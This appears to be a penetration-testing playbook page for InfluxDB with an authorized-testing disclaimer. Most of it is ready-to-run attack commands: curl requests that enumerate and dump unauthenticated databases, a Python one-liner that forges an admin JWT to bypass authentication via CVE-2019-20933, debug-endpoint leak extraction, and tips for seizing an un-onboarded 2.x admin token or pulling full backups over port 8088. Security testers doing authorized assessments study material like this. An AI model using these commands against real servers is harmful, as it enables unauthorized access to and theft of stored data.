---
service: influxdb
title: InfluxDB
ports: 8086, 8088
aliases: influxdb-http
---

# InfluxDB — quick wins

**When you see it:** 8086/tcp open and `/query?q=SHOW+DATABASES` returns databases without
auth → InfluxDB 1.x with `auth-enabled = false` (the default). Full read of all time-series
data, and 1.x has an authentication-bypass CVE that works even when auth *is* enabled.

> Authorized testing only. Triage is read-only (SHOW/SELECT). Steps marked ✏️ exercise an
> auth-bypass — get sign-off before using CVE-2019-20933.

## Triage (read-only)
```sh
curl -s -D - "http://H:8086/ping" -o /dev/null        # X-Influxdb-Version header
curl -s "http://H:8086/query?q=SHOW+DATABASES&pretty=true"   # unauth = open
curl -s "http://H:8086/debug/vars"                    # Go runtime stats, build info
curl -s "http://H:8086/api/v2/setup"                  # 2.x? (onboarding/token model)
```

## Quick wins

### Dump databases and measurements (unauth 1.x)
```sh
curl -s "http://H:8086/query?q=SHOW+DATABASES&pretty=true"
curl -s "http://H:8086/query?db=DBNAME&q=SHOW+MEASUREMENTS"
curl -s "http://H:8086/query?db=DBNAME&q=SELECT+*+FROM+MEASUREMENT+LIMIT+50"
```
*Why:* with `auth-enabled false`, every database and series is readable — telemetry often
includes hostnames, internal IPs, request logs, and occasionally credentials logged as tags.

### JWT auth bypass — CVE-2019-20933 ✏️
```sh
# InfluxDB 1.x with an empty/blank shared secret: forge a JWT for any user
python3 -c "import jwt,time;print(jwt.encode({'username':'admin','exp':int(time.time())+3600},'',algorithm='HS256'))"
curl -s -H "Authorization: Bearer <JWT>" "http://H:8086/query?q=SHOW+DATABASES"
```
*Why:* if JWT auth is enabled with a blank/guessable shared secret, you sign a token for any
username and bypass authentication entirely — the standard InfluxDB 1.x pre-auth CVE.

### Debug vars → build + config leak
```sh
curl -s "http://H:8086/debug/vars" | python3 -m json.tool | grep -Ei "version|commit|build|cmdline"
```
*Why:* `/debug/vars` is unauthenticated and leaks the exact build/version (for CVE mapping)
plus the process command line — sometimes revealing config paths and flags.

## aranum helpers
- `aranumtoolkit/network/enum-influxdb.sh` — dispatcher (`/ping` version header, unauth `SHOW DATABASES`, `/debug/vars`).

## Gotchas
- InfluxDB 2.x (also 8086) uses token/org auth by default — `SHOW DATABASES` won't work; check `/api/v2/setup` (a `true` "allowed" means it's un-onboarded and you can seize the initial admin token).
- 8088 is the RPC/backup port — `influxd backup` against it can pull the full data set if reachable.
- `auth-enabled = true` blocks the SHOW queries but NOT necessarily the JWT bypass — test CVE-2019-20933 regardless.
- Flux vs InfluxQL: 2.x uses Flux over `/api/v2/query`; the `/query` endpoint is the 1.x path.

## Sources
- CVE-2019-20933 advisories; HackTricks `8086-pentesting-influxdb`; InfluxDB 1.x/2.x API docs.
